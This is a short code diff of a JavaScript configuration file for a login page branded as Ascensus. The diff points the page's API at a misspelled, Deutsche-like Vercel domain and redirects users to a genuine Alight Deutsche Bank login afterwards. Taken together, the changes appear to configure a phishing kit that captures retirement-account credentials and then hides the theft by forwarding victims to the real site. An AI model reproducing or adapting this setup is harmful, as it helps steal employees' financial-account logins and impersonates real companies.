@@ -1,5 +1,5 @@
 // Global API Configuration
-window.ascensus_API_BASE = 'http://localhost:5000';
+window.ascensus_API_BASE = 'https://deutseche.vercel.app';
 
 // Global App Settings
 window.APP_CONFIG = {
@@ -7,7 +7,7 @@ window.APP_CONFIG = {
   logoAlt: 'Ascensus logo',
   imageArea: 'https://cache-upn.ap.alight.com/upoint/UPoint/cloudCMS/04496/master/Documents/UpointRedesign/LoginBGImages/Logon_Background_large.jpg',
   botName: 'Sensus Bot',
-  redirectLink: 'https://myaccount.ascensus.com/rplink/account/login',
+  redirectLink: 'https://worklife.alight.com/ah-angular-afirst-web/#/web/deutschebankfour/login',
   footer: {
     company: 'Travers O\'Keefe',
     phone: '(212) 842-3751',
